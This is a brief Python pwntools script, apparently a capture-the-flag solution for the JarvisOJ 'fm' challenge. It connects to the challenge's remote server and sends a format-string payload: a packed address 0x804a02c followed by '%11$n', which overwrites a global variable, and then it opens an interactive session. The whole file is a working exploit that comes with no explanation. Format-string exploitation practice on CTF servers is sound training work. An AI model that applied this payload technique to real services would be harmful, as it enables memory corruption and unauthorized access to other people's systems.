from pwn import *
#p=process('./fm')
p=remote('pwn2.jarvisoj.com',9895)
x_addr=0x804a02c
payload=p32(x_addr)+'%11$n'
p.sendline(payload)
p.interactive()
